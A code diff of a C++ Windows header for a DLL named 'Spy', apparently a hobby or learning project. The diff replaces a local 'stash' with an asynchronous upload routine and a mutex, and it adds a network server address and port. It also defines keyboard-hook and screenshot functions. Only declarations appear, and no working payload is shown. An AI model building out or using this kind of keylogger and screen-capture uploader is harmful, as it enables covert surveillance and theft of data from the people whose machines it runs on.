@@ -5,6 +5,7 @@
 #endif
 
 #include <windows.h>
+#include <stdlib.h>
 #include "../../log-cpp/log.h"
 
 #ifdef WIN32
@@ -24,8 +25,10 @@
 #define SPY_MAX_WTEXT_LTH				MAX_PATH
 #define SPY_TMP_FNAME_LTH				32
 #define SPY_TMP_DIR						"C:\\Users\\xuans\\Desktop\\spy"
-#define SPY_TMP_FNAME_STASH				"stash"
 #define SPY_TMP_KBH_MSZ					20
+#define SPY_IO_IN_SZBUFFER				1024
+#define SPY_NET_SERVER_ADDR				"localhost"
+#define SPY_NET_SERVER_PORT				2512
 
 #define EXPORT __declspec(dllexport)
 #define ADD_FLAG(state, flag) {state |= flag;}
@@ -33,26 +36,24 @@
 #define HAS_FLAG(state, flag) ((state & flag) == flag)
 #define SAFE_FREE(ptr) {if (ptr != NULL) {delete ptr; ptr = NULL;}}
 
-#define strdup _strdup							/* just using _strdup instead of strdup, ignore warning :| I don't know why this warning is happening */
+/* just using _strdup instead of strdup, ignore warning :| I don't know why this warning is happening */
+#define strdup _strdup
+#define itoa _itoa
 
-// take a screenshot and push to stash for pending send to server
-EXPORT VOID take_scrot();
-EXPORT DWORD load_spy();
-EXPORT VOID unload_spy();
-
-class Stash;
+typedef unsigned char byte;
 
 class Spy
 {
-	static Stash * stash;
+	static HANDLE mutex;
+	static void lock();
+	static void unlock();
 	static void get_temp_fname(char * buffer, int l);
 	static void path_combine(char * dst, const char * dir, const char * fname);
-	static Stash * gen_stash();
+	static DWORD upload_async(LPVOID * dir_path);
 public:
 	static DWORD load(HINSTANCE hinstance);
 	static void unload();
 	static void get_temp_fpath(char * buffer, const char * fname = NULL);
-	static Stash * get_stash();
 	static void take_screenshot();
-	static void upload_async();
+	static void notify_upload();
 };
